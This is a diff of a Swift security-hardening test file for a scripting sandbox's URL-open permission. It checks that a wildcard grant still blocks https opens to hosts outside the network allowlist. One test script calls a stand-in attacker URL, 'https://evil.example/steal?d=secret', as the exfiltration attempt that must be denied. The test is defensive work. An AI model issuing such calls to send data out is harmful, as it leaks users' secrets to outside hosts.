@@ -84,12 +84,46 @@ final class SecurityHardeningTests: XCTestCase {
         XCTAssertTrue(opener.openedApps.isEmpty)
     }
 
-    func testOpenAllowedWhenSchemeGrantedWithWildcard() throws {
-        // "*" grants every scheme and waives the per-host re-check.
+    func testOpenWildcardGrantsNonHttpScheme() throws {
+        // "*" grants every scheme; a non-http(s) scheme opens with no network check.
         let transport = LoopbackTransport()
         let recorder = Recorder(transport)
         let opener = RecordingOpenProvider()
         let inst = try instance(manifest(open: ["*"]), transport: transport, opener: opener)
+        inst.evaluate("""
+            vee.open('mailto:hi@example.com')
+              .then(() => console.log('opened'))
+              .catch(e => console.error('denied:' + e.code));
+        """)
+        inst.runUntilQuiescent()
+        XCTAssertEqual(recorder.logs().map(\.message), ["opened"])
+        XCTAssertEqual(opener.openedURLs, ["mailto:hi@example.com"])
+    }
+
+    func testOpenWildcardStillEnforcesNetworkAllowlistForHttp() throws {
+        // R2-MED-1: even "*" cannot open an https URL to a host outside `network`
+        // — the anti-exfil re-check is unconditional; the provider stays untouched.
+        let transport = LoopbackTransport()
+        let recorder = Recorder(transport)
+        let opener = RecordingOpenProvider()
+        let inst = try instance(manifest(open: ["*"]), transport: transport, opener: opener)
+        inst.evaluate("""
+            vee.open('https://evil.example/steal?d=secret')
+              .then(() => console.log('opened'))
+              .catch(e => console.error('denied:' + e.code));
+        """)
+        inst.runUntilQuiescent()
+        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
+        XCTAssertTrue(opener.openedURLs.isEmpty)
+    }
+
+    func testOpenWildcardAllowsHttpWhenHostAllowlisted() throws {
+        // ...and with the host in `network`, an https open under "*" succeeds.
+        let transport = LoopbackTransport()
+        let recorder = Recorder(transport)
+        let opener = RecordingOpenProvider()
+        let inst = try instance(manifest(network: ["example.com"], open: ["*"]),
+                                transport: transport, opener: opener)
         inst.evaluate("""
             vee.open('https://example.com/page')
               .then(() => console.log('opened'))
